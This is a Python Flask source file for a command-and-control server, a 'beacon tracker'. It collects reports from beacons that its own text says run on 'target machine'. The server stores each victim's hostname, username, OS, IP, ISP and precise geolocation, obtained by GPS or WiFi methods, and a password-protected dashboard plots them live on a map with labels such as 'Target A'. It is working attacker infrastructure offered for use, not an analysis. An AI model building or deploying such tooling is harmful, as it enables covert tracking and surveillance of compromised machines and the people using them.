"""
c2_server.py
────────────────────────────────────────────────
C2 (Command & Control) server.
- Password protected login (session based)
- Receives POST /ping from beacons
- Stores pings + notes + host labels to pings.json
- Serves dashboard at GET /
- Exposes /api/pings, /api/note, /api/label, /api/clear
"""

from flask import Flask, request, jsonify, session, redirect, url_for
import json, os, hashlib, secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)  # random session key each run

PINGS_FILE  = "pings.json"
NOTES_FILE  = "notes.json"
LABELS_FILE = "labels.json"

# ── change this to your own password ─────────────────────────────────────────
DASHBOARD_PASSWORD = "c2admin"
# ─────────────────────────────────────────────────────────────────────────────

def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path) as f: return json.load(f)
        except: pass
    return default

def save_json(path, data):
    try:
        with open(path, "w") as f: json.dump(data, f, indent=2)
    except: pass

pings  = load_json(PINGS_FILE,  [])
notes  = load_json(NOTES_FILE,  {})   # { ping_id: "note text" }
labels = load_json(LABELS_FILE, {})   # { hostname: "label text" }

def ping_id(p):
    return hashlib.md5(f"{p.get('timestamp')}{p.get('hostname')}{p.get('ip')}".encode()).hexdigest()[:12]

# ══════════════════════════════════════════════════════════════════════════════
#  LOGIN PAGE HTML
# ══════════════════════════════════════════════════════════════════════════════
LOGIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>C2 // ACCESS</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#080c0f;display:flex;align-items:center;justify-content:center;height:100vh;font-family:'Share Tech Mono',monospace;}
body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.015) 2px,rgba(0,255,65,.015) 4px);pointer-events:none}
.box{width:360px;border:1px solid #1a4a1a;background:#0d1318;padding:40px 36px;}
h1{font-family:'Orbitron',sans-serif;font-size:14px;font-weight:900;letter-spacing:.2em;color:#00ff41;text-shadow:0 0 20px rgba(0,255,65,.5);margin-bottom:6px}
.sub{font-size:9px;color:#2a4a2a;letter-spacing:.15em;text-transform:uppercase;margin-bottom:32px}
label{font-size:9px;color:#4a6a4a;letter-spacing:.12em;text-transform:uppercase;display:block;margin-bottom:6px}
input{width:100%;background:#080c0f;border:1px solid #1a3a1a;color:#00ff41;font-family:'Share Tech Mono',monospace;font-size:13px;padding:10px 12px;outline:none;margin-bottom:20px}
input:focus{border-color:#00aa2a}
button{width:100%;background:transparent;border:1px solid #00aa2a;color:#00ff41;font-family:'Share Tech Mono',monospace;font-size:12px;letter-spacing:.15em;padding:12px;cursor:pointer;text-transform:uppercase;transition:all .2s}
button:hover{background:#0a2a0a}
.err{color:#ff3131;font-size:11px;margin-bottom:16px;display:none}
.err.show{display:block}
.cursor{animation:blink 1s step-end infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
</style>
</head>
<body>
<div class="box">
  <h1>◈ BEACON TRACKER<span class="cursor">_</span></h1>
  <div class="sub">// authorised access only</div>
  <div class="err" id="err">ACCESS DENIED — invalid credentials</div>
  <form method="POST" action="/login">
    <label>Access Code</label>
    <input type="password" name="password" autofocus autocomplete="off" placeholder="enter password"/>
    <button type="submit">[ AUTHENTICATE ]</button>
  </form>
</div>
<script>
  const p = new URLSearchParams(window.location.search);
  if(p.get('err')) document.getElementById('err').classList.add('show');
</script>
</body>
</html>"""

# ══════════════════════════════════════════════════════════════════════════════
#  DASHBOARD HTML
# ══════════════════════════════════════════════════════════════════════════════
DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>C2 // BEACON TRACKER</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
  :root {
    --bg:          #080c0f;
    --bg2:         #0d1318;
    --bg3:         #111920;
    --border:      #1a2a1a;
    --green:       #00ff41;
    --green-dim:   #00aa2a;
    --green-muted: #1a4a1a;
    --red:         #ff3131;
    --amber:       #ffb800;
    --purple:      #bf5fff;
    --text:        #b0c4b0;
    --text-dim:    #4a6a4a;
    --mono:        'Share Tech Mono', monospace;
    --display:     'Orbitron', sans-serif;
  }
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; background: var(--bg); color: var(--green); font-family: var(--mono); font-size: 13px; overflow: hidden; }
  body::before { content:''; position:fixed; inset:0; background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.015) 2px,rgba(0,255,65,.015) 4px); pointer-events:none; z-index:9999; }

  #app { display:grid; grid-template-rows:48px 1fr; grid-template-columns:1fr 360px; height:100vh; gap:1px; background:var(--border); }

  /* header */
  #header { grid-column:1/-1; background:var(--bg2); display:flex; align-items:center; padding:0 20px; gap:16px; border-bottom:1px solid var(--green-muted); }
  #header h1 { font-family:var(--display); font-size:15px; font-weight:900; letter-spacing:.15em; color:var(--green); text-shadow:0 0 20px rgba(0,255,65,.5); }
  .header-right { margin-left:auto; display:flex; gap:16px; align-items:center; }
  .stat { display:flex; flex-direction:column; align-items:flex-end; }
  .stat-label { font-size:9px; color:var(--text-dim); letter-spacing:.12em; text-transform:uppercase; }
  .stat-value { font-size:15px; color:var(--green); font-family:var(--display); font-weight:700; }
  #status-dot { width:8px; height:8px; border-radius:50%; background:var(--green); box-shadow:0 0 8px var(--green); animation:pulse 2s ease-in-out infinite; flex-shrink:0; }
  @keyframes pulse { 0%,100%{opacity:1;box-shadow:0 0 8px var(--green)}50%{opacity:.4;box-shadow:0 0 2px var(--green)} }
  .tag { font-size:9px; padding:2px 7px; border:1px solid var(--green-dim); color:var(--green-dim); letter-spacing:.1em; text-transform:uppercase; }
  .hdr-btn { font-family:var(--mono); font-size:9px; letter-spacing:.1em; padding:4px 10px; border:1px solid; cursor:pointer; text-transform:uppercase; background:transparent; transition:all .2s; }
  .hdr-btn.danger { border-color:#ff3131; color:#ff3131; }
  .hdr-btn.danger:hover { background:rgba(255,49,49,.1); }
  .hdr-btn.logout { border-color:var(--text-dim); color:var(--text-dim); }
  .hdr-btn.logout:hover { border-color:var(--green-dim); color:var(--green-dim); }

  /* map */
  #map-wrap { background:var(--bg); position:relative; overflow:hidden; }
  #map { width:100%; height:100%; }
  #map-wrap::before { content:'GLOBAL BEACON TRACKER // LIVE'; position:absolute; top:12px; left:12px; z-index:500; font-size:9px; letter-spacing:.15em; color:var(--text-dim); text-transform:uppercase; pointer-events:none; }

  /* sidebar */
  #sidebar { background:var(--bg2); display:flex; flex-direction:column; overflow:hidden; }
  .panel-header { padding:10px 14px; border-bottom:1px solid var(--green-muted); font-size:9px; letter-spacing:.15em; text-transform:uppercase; color:var(--text-dim); display:flex; justify-content:space-between; align-items:center; flex-shrink:0; }
  .panel-header span { color:var(--green); }
  #ping-list { flex:1; overflow-y:auto; padding:6px 0; }
  #ping-list::-webkit-scrollbar { width:4px; }
  #ping-list::-webkit-scrollbar-thumb { background:var(--green-muted); }

  /* ping items */
  .ping-item { padding:10px 14px; border-bottom:1px solid rgba(26,42,26,.5); cursor:pointer; transition:background .15s; position:relative; animation:slideIn .3s ease-out; }
  @keyframes slideIn { from{opacity:0;transform:translateX(10px)} to{opacity:1;transform:translateX(0)} }
  .ping-item:hover { background:var(--bg3); }
  .ping-item.selected { background:var(--bg3); border-left:2px solid var(--green); }
  .ping-item.new::after { content:'NEW'; position:absolute; top:10px; right:10px; font-size:8px; color:var(--green); background:var(--green-muted); padding:1px 5px; letter-spacing:.1em; animation:fadeNew 3s forwards; }
  @keyframes fadeNew { 0%,60%{opacity:1}100%{opacity:0} }
  .ping-num { font-size:9px; color:var(--text-dim); margin-bottom:4px; }
  .ping-host { font-size:12px; color:var(--green); margin-bottom:3px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
  .ping-label-tag { font-size:9px; color:var(--purple); border:1px solid var(--purple); padding:1px 5px; margin-left:6px; opacity:.8; }
  .ping-location { font-size:11px; color:var(--amber); margin-bottom:3px; }
  .ping-ip { font-size:10px; color:var(--text-dim); margin-bottom:2px; }
  .ping-time { font-size:9px; color:var(--text-dim); }
  .ping-coords { font-size:9px; color:var(--green-dim); margin-top:2px; }
  .ping-note-preview { font-size:9px; color:var(--purple); margin-top:3px; opacity:.8; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }

  /* detail panel */
  #detail-panel { border-top:1px solid var(--green-muted); padding:12px 14px; flex-shrink:0; background:var(--bg); }
  .detail-title { font-size:9px; letter-spacing:.15em; text-transform:uppercase; color:var(--text-dim); margin-bottom:8px; display:flex; justify-content:space-between; }
  .detail-row { display:flex; gap:8px; margin-bottom:4px; font-size:11px; }
  .detail-key { color:var(--text-dim); min-width:70px; flex-shrink:0; }
  .detail-val { color:var(--green); word-break:break-all; }

  /* label input */
  .label-row { display:flex; gap:6px; margin-bottom:6px; align-items:center; }
  .label-input { flex:1; background:#080c0f; border:1px solid #1a3a1a; color:var(--purple); font-family:var(--mono); font-size:11px; padding:4px 8px; outline:none; }
  .label-input:focus { border-color:var(--purple); }
  .label-input::placeholder { color:#2a2a3a; }

  /* notes textarea */
  .notes-area { width:100%; background:#080c0f; border:1px solid #1a3a1a; color:#b0c4d0; font-family:var(--mono); font-size:11px; padding:8px; resize:none; outline:none; margin-top:4px; height:60px; }
  .notes-area:focus { border-color:var(--green-dim); }
  .notes-area::placeholder { color:#2a3a2a; }
  .save-note-btn { margin-top:5px; font-family:var(--mono); font-size:9px; letter-spacing:.1em; padding:3px 10px; border:1px solid var(--green-dim); color:var(--green-dim); cursor:pointer; background:transparent; text-transform:uppercase; }
  .save-note-btn:hover { background:var(--green-muted); color:var(--green); }
  .save-ok { color:var(--green); font-size:9px; margin-left:8px; opacity:0; transition:opacity .3s; }

  /* empty state */
  #empty-state { padding:30px 14px; color:var(--text-dim); font-size:11px; text-align:center; line-height:1.8; }

  /* leaflet */
  .leaflet-container { background:#050a0e !important; }
  .leaflet-control-zoom a { background:var(--bg2) !important; color:var(--green) !important; border-color:var(--green-muted) !important; }
  .leaflet-control-attribution { background:rgba(8,12,15,.7) !important; color:var(--text-dim) !important; font-size:8px !important; }
  .leaflet-control-attribution a { color:var(--green-dim) !important; }

  /* confirm overlay */
  #confirm-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,.7); z-index:10000; align-items:center; justify-content:center; }
  #confirm-overlay.show { display:flex; }
  .confirm-box { background:var(--bg2); border:1px solid #ff3131; padding:28px 32px; font-family:var(--mono); text-align:center; }
  .confirm-box p { color:var(--green); margin-bottom:20px; font-size:13px; }
  .confirm-box .sub { color:var(--text-dim); font-size:10px; margin-bottom:24px; }
  .confirm-btns { display:flex; gap:12px; justify-content:center; }
  .confirm-btns button { font-family:var(--mono); font-size:11px; letter-spacing:.1em; padding:8px 20px; border:1px solid; cursor:pointer; background:transparent; text-transform:uppercase; }
  .btn-confirm { border-color:#ff3131 !important; color:#ff3131 !important; }
  .btn-confirm:hover { background:rgba(255,49,49,.15) !important; }
  .btn-cancel { border-color:var(--text-dim) !important; color:var(--text-dim) !important; }
</style>
</head>
<body>
<div id="app">

  <header id="header">
    <div id="status-dot"></div>
    <h1>◈ BEACON TRACKER</h1>
    <div class="tag">C2 ACTIVE</div>
    <div class="header-right">
      <div class="stat">
        <span class="stat-label">Total Pings</span>
        <span class="stat-value" id="total-count">0</span>
      </div>
      <div class="stat">
        <span class="stat-label">Unique Hosts</span>
        <span class="stat-value" id="unique-hosts">0</span>
      </div>
      <div class="stat">
        <span class="stat-label">Last Seen</span>
        <span class="stat-value" id="last-seen" style="font-size:11px">—</span>
      </div>
      <button class="hdr-btn danger" onclick="confirmClear()">[ CLEAR ALL ]</button>
      <button class="hdr-btn logout" onclick="location.href='/logout'">[ LOGOUT ]</button>
    </div>
  </header>

  <div id="map-wrap"><div id="map"></div></div>

  <div id="sidebar">
    <div class="panel-header">
      Beacon Log <span id="ping-count">0 pings</span>
    </div>
    <div id="ping-list">
      <div id="empty-state">
        [ awaiting beacon transmissions ]<br>
        <span style="font-size:9px;color:#2a3a2a">run beacon.exe on target machine</span>
      </div>
    </div>

    <div id="detail-panel">
      <div class="detail-title">
        <span>// selected ping detail</span>
      </div>
      <div id="detail-content" style="color:var(--text-dim);font-size:11px">
        click a ping to inspect
      </div>
    </div>
  </div>
</div>

<!-- confirm clear overlay -->
<div id="confirm-overlay">
  <div class="confirm-box">
    <p>CLEAR ALL PING DATA?</p>
    <div class="sub">this will permanently delete all pings, notes and cannot be undone</div>
    <div class="confirm-btns">
      <button class="btn-confirm" onclick="doClear()">[ CONFIRM ]</button>
      <button class="btn-cancel" onclick="cancelClear()">[ CANCEL ]</button>
    </div>
  </div>
</div>

<script>
// ── map ───────────────────────────────────────────────────────────────────────
const map = L.map('map', { center:[20,0], zoom:2, zoomControl:true });
L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
  attribution:'© OpenStreetMap © CARTO', subdomains:'abcd', maxZoom:19
}).addTo(map);

function makeIcon(isNew) {
  return L.divIcon({
    className:'',
    html:`<div style="width:12px;height:12px;border-radius:50%;background:${isNew?'#00ff41':'#00aa2a'};border:2px solid ${isNew?'#00ff41':'#1a4a1a'};box-shadow:0 0 ${isNew?'12px':'6px'} ${isNew?'#00ff41':'#00aa2a'}"></div>`,
    iconSize:[12,12], iconAnchor:[6,6]
  });
}

// ── state ─────────────────────────────────────────────────────────────────────
let knownIds = new Set(), markers = {}, allPings = [], selected = null;
let notesCache = {}, labelsCache = {};

// ── tier badge ────────────────────────────────────────────────────────────────
function tierLabel(ping) {
  const tier = ping.method_tier || 4;
  const acc  = ping.accuracy_m;
  const cols = {1:'#00ff41',2:'#00cc33',3:'#ffb800',4:'#ff6600'};
  const lbls = {1:'GPS',2:'WiFi-API',3:'WiFi-BSSID',4:'IP-GEO'};
  const c = cols[tier]||'#ff6600', l = lbls[tier]||'IP-GEO';
  return `<span style="color:${c};font-size:9px;border:1px solid ${c};padding:1px 4px;margin-right:4px">${l}</span><span style="color:var(--text-dim);font-size:9px">${acc?'±'+acc+'m':''}</span>`;
}

// ── render ping item ──────────────────────────────────────────────────────────
function renderPingItem(ping, index, isNew) {
  const div = document.createElement('div');
  div.className = 'ping-item' + (isNew ? ' new' : '');
  div.dataset.index = index;
  const id    = pingId(ping);
  const note  = notesCache[id]  || '';
  const label = labelsCache[ping.hostname] || '';
  div.innerHTML = `
    <div class="ping-num">#${String(index+1).padStart(3,'0')} ${tierLabel(ping)}</div>
    <div class="ping-host">${ping.hostname||'unknown'} @ ${ping.user||'?'}${label ? `<span class="ping-label-tag">${label}</span>` : ''}</div>
    <div class="ping-location">⌖ ${ping.city||'?'}, ${ping.country||'?'}</div>
    <div class="ping-ip">${ping.ip||'—'} · ${ping.isp||'—'}</div>
    <div class="ping-time">${ping.timestamp||'—'} UTC</div>
    <div class="ping-coords">${ping.lat}, ${ping.lon}</div>
    ${note ? `<div class="ping-note-preview">✎ ${note}</div>` : ''}
  `;
  div.addEventListener('click', () => selectPing(index));
  return div;
}

// ── ping id (matches server side) ────────────────────────────────────────────
function pingId(ping) {
  return `${ping.timestamp}${ping.hostname}${ping.ip}`.replace(/\s/g,'');
}

// ── accuracy circle ───────────────────────────────────────────────────────────
let accuracyCircle = null;
function showAccuracyCircle(ping) {
  if (accuracyCircle) { map.removeLayer(accuracyCircle); accuracyCircle = null; }
  if (!ping.accuracy_m || ping.accuracy_m > 50000) return;
  const cols = {1:'#00ff41',2:'#00cc33',3:'#ffb800',4:'#ff6600'};
  const col  = cols[ping.method_tier] || '#ff6600';
  accuracyCircle = L.circle([ping.lat, ping.lon], {
    radius:ping.accuracy_m, color:col, fillColor:col,
    fillOpacity:.07, weight:1, dashArray:'4 4'
  }).addTo(map);
}

// ── select ping ───────────────────────────────────────────────────────────────
function selectPing(index) {
  const ping = allPings[index];
  if (!ping) return;
  selected = index;

  const zoom = ping.method_tier <= 2 ? 15 : ping.method_tier === 3 ? 13 : 10;
  map.flyTo([ping.lat, ping.lon], zoom, { duration:1.2 });
  showAccuracyCircle(ping);

  Object.values(markers).forEach(m => { m.setIcon(makeIcon(false)); m.setZIndexOffset(0); });
  const key = `${ping.lat},${ping.lon}`;
  if (markers[key]) { markers[key].setIcon(makeIcon(true)); markers[key].setZIndexOffset(1000); }

  document.querySelectorAll('.ping-item').forEach(el => el.classList.remove('selected'));
  const el = document.querySelector(`.ping-item[data-index="${index}"]`);
  if (el) el.classList.add('selected');

  const id    = pingId(ping);
  const note  = notesCache[id] || '';
  const label = labelsCache[ping.hostname] || '';
  const cols  = {1:'#00ff41',2:'#00cc33',3:'#ffb800',4:'#ff6600'};
  const tc    = cols[ping.method_tier] || '#ff6600';

  document.getElementById('detail-content').innerHTML = `
    <div class="detail-row"><span class="detail-key">host</span><span class="detail-val">${ping.hostname||'—'}</span></div>
    <div class="detail-row"><span class="detail-key">user</span><span class="detail-val">${ping.user||'—'}</span></div>
    <div class="detail-row"><span class="detail-key">os</span><span class="detail-val">${ping.os||'—'}</span></div>
    <div class="detail-row"><span class="detail-key">ip</span><span class="detail-val">${ping.ip||'—'}</span></div>
    <div class="detail-row"><span class="detail-key">isp</span><span class="detail-val">${ping.isp||'—'}</span></div>
    <div class="detail-row"><span class="detail-key">location</span><span class="detail-val">${ping.city}, ${ping.region}, ${ping.country}</span></div>
    <div class="detail-row"><span class="detail-key">coords</span><span class="detail-val">${ping.lat}, ${ping.lon}</span></div>
    <div class="detail-row"><span class="detail-key">accuracy</span><span class="detail-val" style="color:${tc}">±${ping.accuracy_m||'?'}m — ${ping.method||'?'}</span></div>
    <div class="detail-row"><span class="detail-key">time</span><span class="detail-val">${ping.timestamp} UTC</span></div>

    <div style="margin-top:10px;border-top:1px solid var(--green-muted);padding-top:10px">
      <div class="label-row">
        <span style="font-size:9px;color:var(--text-dim);min-width:70px">host label</span>
        <input class="label-input" id="label-input" placeholder="e.g. Target A / test machine" value="${label}"/>
      </div>
      <div style="font-size:9px;color:var(--text-dim);margin-bottom:4px">note</div>
      <textarea class="notes-area" id="note-input" placeholder="add a note about this ping...">${note}</textarea>
      <div style="display:flex;align-items:center">
        <button class="save-note-btn" onclick="saveNote('${id}','${ping.hostname}')">[ SAVE ]</button>
        <span class="save-ok" id="save-ok">✓ saved</span>
      </div>
    </div>
  `;
}

// ── save note + label ─────────────────────────────────────────────────────────
async function saveNote(id, hostname) {
  const note  = document.getElementById('note-input').value;
  const label = document.getElementById('label-input').value;

  await fetch('/api/note',  { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id, note}) });
  await fetch('/api/label', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({hostname, label}) });

  notesCache[id]       = note;
  labelsCache[hostname] = label;

  // flash saved indicator
  const ok = document.getElementById('save-ok');
  ok.style.opacity = '1';
  setTimeout(() => ok.style.opacity = '0', 2000);

  // re-render the ping item to show updated note preview + label
  const idx  = allPings.findIndex(p => pingId(p) === id);
  if (idx >= 0) {
    const list    = document.getElementById('ping-list');
    const oldItem = list.querySelector(`.ping-item[data-index="${idx}"]`);
    if (oldItem) {
      const newItem = renderPingItem(allPings[idx], idx, false);
      newItem.classList.add('selected');
      list.replaceChild(newItem, oldItem);
    }
  }
}

// ── add map marker ────────────────────────────────────────────────────────────
function addMarker(ping, isNew) {
  if (ping.lat == null || ping.lon == null) return;
  const key = `${ping.lat},${ping.lon}`;
  const popupHtml = `<div style="font-family:'Share Tech Mono',monospace;font-size:11px;color:#00ff41;background:#0d1318;padding:8px;border:1px solid #1a4a1a"><b>${ping.hostname||'unknown'}</b><br>${ping.city}, ${ping.country}<br><span style="color:#4a6a4a">${ping.ip}</span></div>`;
  if (markers[key]) {
    markers[key].setIcon(makeIcon(isNew));
  } else {
    markers[key] = L.marker([ping.lat, ping.lon], { icon:makeIcon(isNew) })
      .addTo(map)
      .bindPopup(L.popup({ className:'dark-popup', closeButton:false, maxWidth:200 }).setContent(popupHtml));
    markers[key].on('click', () => {
      const idx = allPings.findIndex(p => p.lat===ping.lat && p.lon===ping.lon);
      if (idx >= 0) selectPing(idx);
    });
  }
}

// ── stats ─────────────────────────────────────────────────────────────────────
function updateStats() {
  document.getElementById('total-count').textContent = allPings.length;
  document.getElementById('unique-hosts').textContent = new Set(allPings.map(p=>p.hostname)).size;
  if (allPings.length > 0) {
    const last = allPings[allPings.length-1];
    document.getElementById('last-seen').textContent = last.timestamp ? last.timestamp.split(' ')[1] : '—';
  }
  document.getElementById('ping-count').textContent = `${allPings.length} ping${allPings.length!==1?'s':''}`;
}

// ── clear confirm ─────────────────────────────────────────────────────────────
function confirmClear() { document.getElementById('confirm-overlay').classList.add('show'); }
function cancelClear()  { document.getElementById('confirm-overlay').classList.remove('show'); }
async function doClear() {
  await fetch('/api/clear', { method:'POST' });
  cancelClear();
  // reset everything
  allPings=[]; knownIds=new Set(); notesCache={}; labelsCache={};
  Object.values(markers).forEach(m => map.removeLayer(m));
  markers={};
  if (accuracyCircle) { map.removeLayer(accuracyCircle); accuracyCircle=null; }
  document.getElementById('ping-list').innerHTML = '<div id="empty-state">[ ping log cleared ]</div>';
  document.getElementById('detail-content').innerHTML = 'click a ping to inspect';
  updateStats();
}

// ── poll ──────────────────────────────────────────────────────────────────────
async function poll() {
  try {
    const [pingsRes, notesRes, labelsRes] = await Promise.all([
      fetch('/api/pings'),
      fetch('/api/notes'),
      fetch('/api/labels')
    ]);
    const data      = await pingsRes.json();
    notesCache      = await notesRes.json();
    labelsCache     = await labelsRes.json();

    const list  = document.getElementById('ping-list');
    const empty = document.getElementById('empty-state');
    let hasNew  = false;

    data.forEach((ping, i) => {
      const id = pingId(ping);
      if (!knownIds.has(id)) {
        knownIds.add(id);
        allPings.push(ping);
        hasNew = true;
        if (empty) empty.remove();
        list.insertBefore(renderPingItem(ping, allPings.length-1, true), list.firstChild);
        addMarker(ping, true);
      }
    });

    if (hasNew) updateStats();
  } catch(e) { console.warn('poll error', e); }
}

poll();
setInterval(poll, 5000);
</script>
</body>
</html>"""

# ══════════════════════════════════════════════════════════════════════════════
#  AUTH MIDDLEWARE
# ══════════════════════════════════════════════════════════════════════════════
def is_authed():
    return session.get("authed") is True

# ══════════════════════════════════════════════════════════════════════════════
#  ROUTES
# ══════════════════════════════════════════════════════════════════════════════
@app.route("/")
def dashboard():
    if not is_authed(): return redirect(url_for("login"))
    return DASHBOARD_HTML

@app.route("/login", methods=["GET","POST"])
def login():
    if request.method == "POST":
        pw = request.form.get("password","")
        if pw == DASHBOARD_PASSWORD:
            session["authed"] = True
            return redirect(url_for("dashboard"))
        return redirect(url_for("login") + "?err=1")
    return LOGIN_HTML

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

@app.route("/ping", methods=["POST"])
def receive_ping():
    data = request.get_json()
    if not data: return jsonify({"error":"no data"}), 400
    pings.append(data)
    save_json(PINGS_FILE, pings)
    print(f"\n[C2] PING #{len(pings)} — {data.get('hostname')} | {data.get('city')}, {data.get('country')} | {data.get('ip')} | tier {data.get('method_tier','?')} ±{data.get('accuracy_m','?')}m")
    return jsonify({"status":"ok"}), 200

@app.route("/api/pings")
def api_pings():
    if not is_authed(): return jsonify({"error":"unauthorized"}), 401
    return jsonify(pings)

@app.route("/api/notes")
def api_notes():
    if not is_authed(): return jsonify({"error":"unauthorized"}), 401
    return jsonify(notes)

@app.route("/api/labels")
def api_labels():
    if not is_authed(): return jsonify({"error":"unauthorized"}), 401
    return jsonify(labels)

@app.route("/api/note", methods=["POST"])
def api_note():
    if not is_authed(): return jsonify({"error":"unauthorized"}), 401
    d = request.get_json()
    notes[d["id"]] = d["note"]
    save_json(NOTES_FILE, notes)
    return jsonify({"status":"ok"})

@app.route("/api/label", methods=["POST"])
def api_label():
    if not is_authed(): return jsonify({"error":"unauthorized"}), 401
    d = request.get_json()
    labels[d["hostname"]] = d["label"]
    save_json(LABELS_FILE, labels)
    return jsonify({"status":"ok"})

@app.route("/api/clear", methods=["POST"])
def api_clear():
    if not is_authed(): return jsonify({"error":"unauthorized"}), 401
    pings.clear(); notes.clear(); labels.clear()
    save_json(PINGS_FILE, pings)
    save_json(NOTES_FILE, notes)
    save_json(LABELS_FILE, labels)
    return jsonify({"status":"cleared"})

if __name__ == "__main__":
    print("╔══════════════════════════════════════╗")
    print("║     C2 BEACON TRACKER — ONLINE       ║")
    print("╠══════════════════════════════════════╣")
    print(f"║  Dashboard  →  http://127.0.0.1:5000 ║")
    print(f"║  Password   →  {DASHBOARD_PASSWORD:<22} ║")
    print("║  Ping URL   →  POST /ping            ║")
    print("╚══════════════════════════════════════╝\n")
    app.run(host="0.0.0.0", port=5000, debug=False)
